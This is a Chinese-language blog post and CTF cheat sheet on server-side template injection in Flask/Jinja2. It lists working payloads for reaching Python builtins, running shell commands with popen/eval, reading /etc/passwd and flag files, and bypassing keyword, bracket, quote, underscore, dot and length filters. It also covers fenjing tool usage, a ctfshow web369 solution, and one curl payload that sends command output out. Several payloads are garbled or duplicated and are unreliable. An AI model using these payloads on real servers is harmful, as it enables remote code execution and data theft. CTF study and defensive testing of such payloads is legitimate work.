---
title: SSTI：找基类、打命令与绕过滤
date: 2026-11-22 08:01:00
author: Xendr1a
categories: [Web安全, Web基础]
tags: [SSTI, Flask, Python]
description: SSTI 的完整利用链：找基类、常用 payload、fenjing、关键字与字符绕过、长度限制。
toc: true
---

从「先找注入点」开始，串起 Python2/3 找基类、常用命令执行 payload、fenjing 自动化，以及关键字、字符和长度限制的绕过。

## SSTI

流程

先找注入点

```text
获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]

#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()[40]('/etc/passwd').read()
#写文件
[].__class__.__bases__[0].__subclasses__()[40]('/tmp').write('test')

#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()

#python3.7
#命令执行
{% raw %}{%{% endraw %} for c in [].__class__.__base__.__subclasses__() %}{% raw %}{%{% endraw %} if c.__name__=='catch_warnings' %}{% raw %}{{{% endraw %} c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% raw %}{%{% endraw %} endif %}{% raw %}{%{% endraw %} endfor %}
#文件操作
{% raw %}{%{% endraw %} for c in [].__class__.__base__.__subclasses__() %}{% raw %}{%{% endraw %} if c.__name__=='catch_warnings' %}{% raw %}{{{% endraw %} c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% raw %}{%{% endraw %} endif %}{% raw %}{%{% endraw %} endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__['popen']('dir').read()
```

## fenjing

```text
> Usage: python -m fenjing scan [OPTIONS]
>
> 扫描指定的网站
>
> Options:
> -u, --url TEXT       需要扫描的URL
> -e, --exec-cmd TEXT  成功后执行的shell指令，不填则进入交互模式
> --interval FLOAT     每次请求的间隔
> --detect-mode TEXT   检测模式，可为accurate或fast
> --user-agent TEXT    请求时使用的User Agent
> --header TEXT        请求时使用的Headers
> --cookies TEXT       请求时使用的Cookie
> --help               Show this message and exit.
>
> Usage: python -m fenjing crack [OPTIONS]
>
> 攻击指定的表单
>
> Options:
> -u, --url TEXT       form所在的URL
> -a, --action TEXT    form的action，默认为当前路径
> -m, --method TEXT    form的提交方式，默认为POST
> -i, --inputs TEXT    form的参数，以逗号分隔
> -e, --exec-cmd TEXT  成功后执行的shell指令，不填则成功后进入交互模式
> --interval FLOAT     每次请求的间隔
> --detect-mode TEXT   分析模式，可为accurate或fast
> --user-agent TEXT    请求时使用的User Agent
> --header TEXT        请求时使用的Headers
> --cookies TEXT       请求时使用的Cookie
> --help               Show this message and exit.
>
> Usage: python -m fenjing get-config [OPTIONS]
>
> 攻击指定的表单，并获得目标服务器的flask config
>
> Options:
> -u, --url TEXT      form所在的URL
> -a, --action TEXT   form的action，默认为当前路径
> -m, --method TEXT   form的提交方式，默认为POST
> -i, --inputs TEXT   form的参数，以逗号分隔
> --interval FLOAT    每次请求的间隔
> --detect-mode TEXT  分析模式，可为accurate或fast
> --user-agent TEXT   请求时使用的User Agent
> --header TEXT       请求时使用的Headers
> --cookies TEXT      请求时使用的Cookie
> --help              Show this message and exit.
```

## 常用payload

```text
1、任意命令执行
{% raw %}{%{% endraw %}for i in ''.__class__.__base__.__subclasses__()%}{% raw %}{%{% endraw %}if i.__name__ =='_wrap_close'%}{% raw %}{%{% endraw %}print i.__init__.__globals__['popen']('ls /').read()%}{% raw %}{%{% endraw %}endif%}{% raw %}{%{% endraw %}endfor%}
2、任意命令执行
{% raw %}{{{% endraw %}"".__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}
//这个138对应的类是os._wrap_close，只需要找到这个类的索引就可以利用这个payload
3、任意命令执行
{% raw %}{{{% endraw %}url_for.__globals__['__builtins__']['eval']("__import__('os').popen('dir').read()")}}
4、任意命令执行
{% raw %}{{{% endraw %}x.__class__.__bases__[0].__subclasses__()[132].__init__.__globals__['popen']('ls /').read()}}
//x的含义是可以为任意字母，不仅仅限于x
5、任意命令执行
{% raw %}{{{% endraw %}config.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}
6、文件读取
{% raw %}{{{% endraw %}x.__class__.__bases__[0].__subclasses__()[80].__init__.__globals__['__builtins__'].open('app.py','r').read()}}
对应类为_frozen_importlib._ModuleLock
//x的含义是可以为任意字母，不仅仅限于x
7.
{% raw %}{{{% endraw %}lipsum|attr("__globals__")|attr("__getitem__")("os")|attr("popen")("cat flag")|attr("read")()}}
```

## 关键字绕过

#### 利用字符串拼接绕过

利用“+”进行字符串拼接

```text
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[40]('/fl'+'ag').read()}}

{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("o"+"s").popen("ls /").read()')}}

{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__buil'+'tins__']['eval']('__import__("os").popen("ls /").read()')}}
```

##### 利用编码绕过

base绕过

```text
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['X19idWlsdGluc19f'.decode('base64')]['ZXZhbA**'.decode('base64')]('X19pbXBvcnRfXygib3MiKS5wb3BlbigibHMgLyIpLnJlYWQoKQ**'.decode('base64'))}}

等于
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}
```

##### 利用Unicode编码绕过关键字（flask适用）

unicode编码绕过是一种网上没提出的方法。

我们可以利用unicode编码的方法，绕过关键字过滤，例如：

```text
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\u005f\u005f\u0062\u0075\u0069\u006c\u0074\u0069\u006e\u0073\u005f\u005f']['\u0065\u0076\u0061\u006c']('__import__("os").popen("ls /").read()')}}

{% raw %}{{{% endraw %}().__class__.__base__.__subclasses__()[77].__init__.__globals__['\u006f\u0073'].popen('\u006c\u0073\u0020\u002f').read()}}

就等于
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{% raw %}{{{% endraw %}().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

##### 利用Hex编码绕过关键字

和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。

我们可以利用hex编码的方法，绕过关键字过滤，例如：

##### 利用Hex编码绕过关键字

和上面那个一样，只不过将Unicode编码换成了Hex编码，适用于过滤了“u”的情况。

我们可以利用hex编码的方法，绕过关键字过滤，例如：

```text
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['\x5f\x5f\x62\x75\x69\x6c\x74\x69\x6e\x73\x5f\x5f']['\x65\x76\x61\x6c']('__import__("os").popen("ls /").read()')}}

{% raw %}{{{% endraw %}().__class__.__base__.__subclasses__()[77].__init__.__globals__['\x6f\x73'].popen('\x6c\x73\x20\x2f').read()}}

等同于
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("ls /").read()')}}

{% raw %}{{{% endraw %}().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
```

##### 利用引号绕过

我们可以利用引号来绕过对关键字的过滤。例如，过滤了flag，那么我们可以用 `fl""ag` 或 `fl''ag` 的形式来绕过：

##### 利用join()函数绕过

我们可以利用join()函数来绕过关键字过滤。例如，题目过滤了flag，那么我们可以用如下方法绕过：

```text
[].__class__.__base__.__subclasses__()[40]("fla".join("/g")).read()
```

##### 利用~绕过

```text
{% raw %}{{{% endraw %}config.__init__.__globals__['__buil'~'tins__'].eval("__imp"~"ort__('os').popen('ls /').read()")}}

{% raw %}{%{% endraw %}set a='__clas'%}{% raw %}{%{% endraw %}set b='s__'%}{% raw %}{%{% endraw %}print(a~b)%}
```

## ctfshow web369

这题我想单独学习一下payload的思路

```text
?name=
{% raw %}{%{% endraw %} set po=dict(po=a,p=a)|join%}
#这里是运用到了python字典的知识dict(po=a, p=a) 会生成字典 {"po": a, "p": a}。
#|join 将字典的 键（keys） 合并为字符串，即 "pop"
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(24)%}
#这里单独放下面讲，就是让a=_
{% raw %}{%{% endraw %} set ini=(a,a,dict(init=a)|join,a,a)|join()%}
#这里是__init__下面以此类推
{% raw %}{%{% endraw %} set glo=(a,a,dict(globals=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set geti=(a,a,dict(getitem=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set built=(a,a,dict(builtins=a)|join,a,a)|join()%}
{% raw %}{%{% endraw %} set x=(q|attr(ini)|attr(glo)|attr(geti))(built)%}
#这里联合上面的值，访问 __builtins__ 模块。（为了使用chr
{% raw %}{%{% endraw %} set chr=x.chr%}
{% raw %}{%{% endraw %} set file=chr(47)%2bchr(102)%2bchr(108)%2bchr(97)%2bchr(103)%}
#chr(47) → /，chr(102) → f，chr(108) → l，chr(97) → a，chr(103) → g，组合成 /flag。
#x.open(file).read() 调用 open('/flag').read()。
{% raw %}{%{% endraw %}print(x.open(file).read())%}
```

```text
{% raw %}{%{% endraw %} set a=(()|select|string|list)|attr(po)(24)%}
在 Jinja2 模板引擎中，表达式 a=(()|select|string|list).pop(24) 之所以将变量 a 赋值为下划线（_），是因为它利用了模板过滤器的链式操作和生成器对象字符串表示的特定结构

select 是 Jinja2 的过滤器，通常用于筛选可迭代对象中符合条件的元素。
当不传递条件参数时（如 ()|select），它会生成一个空的生成器对象。
生成器对象的默认字符串表示形如：
"<generator object select_or_reject at 0x...>"
| string 将生成器对象转换为字符串：
str_result = str(() | select)  # 例如：'<generator object select_or_reject at 0x7f8c1d3e7a50>'
| list 将字符串转换为字符列表：
list_result = list(str_result)  # 例如：['<', 'g', 'e', 'n', ..., '_', ...]
字符串 "<generator object select_or_reject ...>" 的字符索引如下：
0: <
1: g
2: e
3: n
...
24: _  # 对应 "select_or_reject" 中的下划线
.pop(24) 提取索引 24 的字符，即 _。
所以得到了a=_
```

```text
pop()  用于移除列表中的一个元素（默认最后一个元素），并且返回该元素的值。
```

## 绕过字符

##### 过滤了中括号[ ]

**利用** **`__getitem__()`** **绕过**

可以使用 `__getitem__()` 方法输出序列属性中的某个索引处的元素，如：

```text
用魔术方法__getitem__来代替方括号

__globals__.__getitem__('__builtins__')      是等效的      __globals__['__builtins__']

__bases__.__getitem__(0)         和         __bases__[0]

__globals__.__getitem__(request.cookies.x1)   cookie:x1=__builtins__;
相当于
__globals__['__builtins__']
```

列如

```text
{% raw %}{{{% endraw %}''.__class__.__mro__.__getitem__(2).__subclasses__().__getitem__(40)('/etc/passwd').read()}}       // 指定序列属性

{% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().__getitem__(59).__init__.__globals__.__getitem__('__builtins__').__getitem__('eval')('__import__("os").popen("ls /").read()')}}       // 指定字典属
```

### 单双引号

1

**利用chr()绕过**

先获取chr()函数，赋值给chr，后面再拼接成一个字符串

```text
request.args.x

[request.args.x]&x=__builtins__       等同于['__builtins__']
(request.args.x)&x=open('/flag').read     等同于("open('/flag').read")

request.cookies.x
?name={% raw %}{{{% endraw %}config.__class__.__init__.__globals__[request.cookies.x1].eval(request.cookies.x2)}}
cookie:
x1=__builtins__;x2=__import__('os').popen('tac /f*').read()
```

## 下划线__

### **利用request对象绕过**

### 用16进制编码

```text
config['\x5f\x5fclass\x5f\x5f']   相当于  config.__class__
```

### 还有利用jinja框架的编码直接写出下划线的

```text
{% raw %}{%{% endraw %} set a=(()|select|string|list).pop(24)%}{% raw %}{%{% endraw %}print(a)%}

解释一下，感觉类似于截取
(): 这是一个空的元组。
|select: 这是Jinja2中的过滤器，通常用于从序列中选择元素。
|string: 这个过滤器通常用于将值转换为字符串。
|list: 这个过滤器通常用于将值转换为列表。
.pop(24): 这是Python中列表的一个方法，用于移除并返回列表中的指定索引位置的元素。
```

## 中括号[ ]

##### **利用** **`__getitem__()`** **绕过**

可以使用 `__getitem__()` 方法输出序列属性中的某个索引处的元素，如：

列如

## 单双引号

### **利用chr()绕过**

先获取chr()函数，赋值给chr，后面再拼接成一个字符串

```text
{% raw %}{%{% endraw %} set chr=().__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{% raw %}{{{% endraw %}().__class__.__bases__.[0].__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

# {% raw %}{%{% endraw %} set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr%}{% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)+chr(101)+chr(116)+chr(99)+chr(47)+chr(112)+chr(97)+chr(115)+chr(115)+chr(119)+chr(100)).read()}}

等于
{% raw %}{{{% endraw %}().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
```

### **利用request对象绕过**

## 大括号 {% raw %}{{{% endraw %}

### 利用{% raw %}{%{% endraw %}print()}

```text
{% raw %}{%{% endraw %}print(config.__class__.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()"))%}
等价于
{% raw %}{{{% endraw %}config.__class__.__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}
```

### 利用for 和if

```text
{% raw %}{%{% endraw %}for i in ''.__class__.__base__.__subclasses__()%}{% raw %}{%{% endraw %}if i.__name__ =='_wrap_close'%}{% raw %}{%{% endraw %}print i.__init__.__globals__['popen']('ls /').read()%}{% raw %}{%{% endraw %}endif%}{% raw %}{%{% endraw %}endfor%}

{% raw %}{{{% endraw %}().__class__.__base__.__subclasses__()[132].__init__.__globals__['__builtins__'].eval("__import__('os').popen('ls /').read()")}}
```

## 点 .

### **利用** **`|attr()`** **绕过（适用于flask）**

```text
(config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__'))(request.cookies.x1)  cookie:x1=__builtins__
相当于
config.__class__.__init__.__globals__.__getitem__('__builtins__')
再而config.__class__.__init__.__globals__['__builtins__']
```

### 用方括号

```text
config['__class__']['__bases__'][0]       相当于config.__class__.__bases__[0]
```

## 长度限制

##### 当遇到 SSTI 长度限制时，在没有过滤且限制长度较大时可以优先尝试使用较短的 Payload：

```text
{% raw %}{{{% endraw %}url_for.__globals__.os.popen('whoami').read()}}
 
{% raw %}{{{% endraw %}lipsum.__globals__.os.popen('whoami').read()}}
```

当存在过滤且长度限制较短时，可利用 **config 全局对象分段保存** Payload：

```text
{% raw %}{%{% endraw %}set x=config.update(l=lipsum)%}
 
{% raw %}{%{% endraw %}set x=config.update(g=request.args.a)%}&a=__globals__
 
{% raw %}{%{% endraw %}set x=config.update(f=config.l|attr(config.g))%}
 
{% raw %}{%{% endraw %}set x=config.update(o=config.f.os)%}
 
{% raw %}{%{% endraw %}set x=config.update(p=config.o.popen)%}
 
{% raw %}{%{% endraw %}print(config.p(request.args.c).read())%}&c=whoami
```

## SSTI（续）

一般步骤

row

```text
1.随便找一个内置类对象用__class__拿到他所对应的类
2.用__bases__拿到基类（<class 'object'>）
3.用__subclasses__()拿到子类列表
4.在子类列表中直接寻找可以利用的类getshell
```

对象→类→基本类→子类→__init__方法→__globals__属性→__builtins__属性→eval函数

row

<u>***常用函数***</u>

col

```text
__class__            类的一个内置属性，表示实例对象的类。
__base__             类型对象的直接基类
__bases__            类型对象的全部基类，以元组形式，类型的实例通常没有属性 __bases__
__mro__              查看继承关系和调用顺序，返回元组。此属性是由类组成的元组，在方法解析期间会基于它来查找基类。
__subclasses__()     返回这个类的子类集合，Each class keeps a list of weak references to its immediate subclasses. This method returns a list of all those references still alive. The list is in definition order.
__init__             初始化类，返回的类型是function
__globals__          使用方式是 函数名.__globals__获取function所处空间下可使用的module、方法以及所有变量。
__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里
__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如：a.xxx/a.xxx()），都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。
__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')
__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身.
__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()]
__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。
url_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
get_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app。
lipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{% raw %}{{{% endraw %}lipsum.__globals__['os'].popen('ls').read()}}
current_app          应用上下文，一个全局变量。
config               当前application的所有配置。此外，也可以这样{% raw %}{{{% endraw %} config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {% raw %}{{{% endraw %}g}}得到<flask.g of 'flask_ssti'>
dict.get(key, default=None) 返回指定键的值，如果值不在字典中返回default值
dict.setdefault(key, default=None) 和get()类似, 但如果键不存在于字典中，将会添加键并将值设为default
request              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。
此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\self\fd/3').read()
request.args.x1      get传参
request.values.x1    所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1      post传参 (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data         post传参 (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
[].__class__.__base__
''.__class__.__mro__[2]
().__class__.__base__
{}.__class__.__base__
request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
或者
[].__class__.__bases__[0]       //其他的类似
__new__功能：用所给类创建一个对象，并且返回这个对象。

```

col

row

<u>**部分传参**</u>

```text
request.args.x1        get传参
request.values.x1      所有参数
request.cookies      cookies参数
request.headers      请求头参数
request.form.x1        post传参    (Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)
request.data           post传参    (Content-Type:a/b)
request.json         post传json  (Content-Type: application/json)
config               当前application的所有配置。此外，也可以这样{% raw %}{{{% endraw %}config.__class__.__init__.__globals__['os'].popen('ls').read() }}
g                    {% raw %}{{{% endraw %}g}}得到<flask.g of 'flask_ssti'>
```

**常用过滤器**

```text
issubclass(A,B): 判断A类是否是B类的子类
 
int()：将值转换为int类型；

float()：将值转换为float类型；

lower()：将字符串转换为小写；

upper()：将字符串转换为大写；

title()：把值中的每个单词的首字母都转成大写；

capitalize()：把变量值的首字母转成大写，其余字母转小写；

trim()：截取字符串前面和后面的空白字符；

wordcount()：计算一个长字符串中单词的个数；

reverse()：字符串反转；

replace(value,old,new)： 替换将old替换为new的字符串；

truncate(value,length=255,killwords=False)：截取length长度的字符串；

striptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；

escape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。

safe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {% raw %}{{{% endraw %}'<em>hello</em>'|safe}}；

list()：将变量列成列表；

string()：将变量转换成字符串；

join()：将一个序列中的参数值拼接成字符串。示例看上面payload；

abs()：返回一个数值的绝对值；

first()：返回一个序列的第一个元素；

last()：返回一个序列的最后一个元素；

format(value,arags,*kwargs)：格式化字符串。比如：{% raw %}{{{% endraw %} "%s" - "%s"|format('Hello?',"Foo!") }}将输出：Helloo? - Foo!

length()：返回一个序列或者字典的长度；

sum()：返回列表内数值的和；

sort()：返回排序后的列表；

default(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。

length()返回字符串的长度，别名是count

select() 通过对每个对象应用测试并仅选择测试成功的对象来筛选对象序列。如果没有指定测试，则每个对象都将被计算为布尔值
可以用来获取字符串
实际使用为
()|select|string
结果如下
<generator object select_or_reject at 0x0000022717FF33C0>
```

## PY ssti

**dict** ：保存类实例或对象实例的属性变量键值对字典  
**class** ：返回一个实例所属的类  
**mro**   ：返回一个包含对象所继承的基类元组，方法在解析时按照元组的顺序解析。  
**bases** ：以元组形式返回一个类直接所继承的类（可以理解为直接父类）__base__ ：和上面的bases大概相同，都是返回当前类所继承的类，即基类，区别是base返回单个，bases返回是元组      // **base__和__mro__都是用来寻找基类的****subclasses** **：以列表返回类的子类****init** **：类的初始化方法****globals**    **：对包含函数全局变量的字典的引用__builtin__&amp;&amp;__builtins** ：python中可以直接运行一些函数，例如int()，list()等等。 这些函数可以在__builtin__可以查到。查看的方法是dir(__builtins__) 在py3中__builtin__被换成了builtin 1.在主模块main中，__builtins__是对内建模块__builtin__本身的引用，即__builtins__完全等价于__builtin__。 2.非主模块main中，__builtins__仅是对__builtin__.__dict__的引用，而非__builtin__本身

```text
获得基类
#python2.7
''.__class__.__mro__[2]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
#python3.7
''.__。。。class__.__mro__[1]
{}.__class__.__bases__[0]
().__class__.__bases__[0]
[].__class__.__bases__[0]
request.__class__.__mro__[1]
```

```text
#python 2.7
#文件操作
#找到file类
[].__class__.__bases__[0].__subclasses__()[40]
#读文件
[].__class__.__bases__[0].__subclasses__()40.read()
#写文件
[].__class__.__bases__[0].__subclasses__()40.write('test')
```

```text
#命令执行
#os执行
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache下有os类，可以直接执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()
#eval,impoer等全局函数
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__下有eval，__import__等的全局函数，可以利用此来执行命令：
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']'eval'
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.eval("__import__('os').popen('id').read()")
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()
[].__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']'__import__'.popen('id').read()
```

```text
#python3.7
#命令执行
{% raw %}{%{% endraw %} for c in [].__class__.__base__.__subclasses__() %}{% raw %}{%{% endraw %} if c.__name__=='catch_warnings' %}{% raw %}{{{% endraw %} c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()") }}{% raw %}{%{% endraw %} endif %}{% raw %}{%{% endraw %} endfor %}
#文件操作
{% raw %}{%{% endraw %} for c in [].__class__.__base__.__subclasses__() %}{% raw %}{%{% endraw %} if c.__name__=='catch_warnings' %}{% raw %}{{{% endraw %} c.__init__.__globals__['__builtins__'].open('filename', 'r').read() }}{% raw %}{%{% endraw %} endif %}{% raw %}{%{% endraw %} endfor %}
#windows下的os命令
"".__class__.__bases__[0].__subclasses__()[118].__init__.__globals__'popen'.read()
```

绕过waf的payload：

过滤[

```text
#getitem、pop ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)('/etc/passwd').read() ''.__class__.__mro__.__getitem__(2).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen('ls').read()
```

过滤引号

```text
chr函数 {% raw %}{%{% endraw %} set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %} {% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(chr(47)%2bchr(101)%2bchr(116)%2bchr(99)%2bchr(47)%2bchr(112)%2bchr(97)%2bchr(115)%2bchr(115)%2bchr(119)%2bchr(100)).read()}}request对象 {% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().pop(40)(request.args.path).read() }}&path=/etc/passwd 
#命令执行 
{% raw %}{%{% endraw %} set chr=().__class__.__bases__.__getitem__(0).__subclasses__()[59].__init__.__globals__.__builtins__.chr %} {% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(chr(105)%2bchr(100)).read() }} {% raw %}{{{% endraw %}().__class__.__bases__.__getitem__(0).__subclasses__().pop(59).__init__.func_globals.linecache.os.popen(request.args.cmd).read() }}&cmd=id
```

过滤下划线

```text
{% raw %}{{{% endraw %}''[request.args.class][request.args.mro][2]request.args.subclasses40.read() }}&class=__class__&mro=__mro__&subclasses=__subclasses__
```

过滤花括号

```text
#用{% raw %}{%{% endraw %}%}标记 {% raw %}{%{% endraw %} if ''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.linecache.os.popen('curl http://127.0.0.1:7999/?i=whoami').read()=='p' %}1{% raw %}{%{% endraw %} endif %}
```

#### 4.payload的收集

```text
&123;&123;''.__class__.__base__.__subclasses__()[169].__init__.__globals__['sys'].modules['os'].popen("cat /flag").read()}}
```

```text
// os._wrap_close类中的popen
&123;&123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__'popen'.read()}}
```

```text
// __import__方法
&123;&123;"".__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__import__('os').popen('whoami').read()}}
```

```text
// builtins
<code-line class="line-numbers-rows"></code-line>&123;&123;"".__class__.__bases__[0].__subclasses__()[128].__init__.__globals__'popen'.read()}}
```

```text
// Jinja2创建的url_for()方法
<code-line class="line-numbers-rows"></code-line>&123;&123;url_for.__globals__.os.popen("cat /flag").read()}}</pre>
```
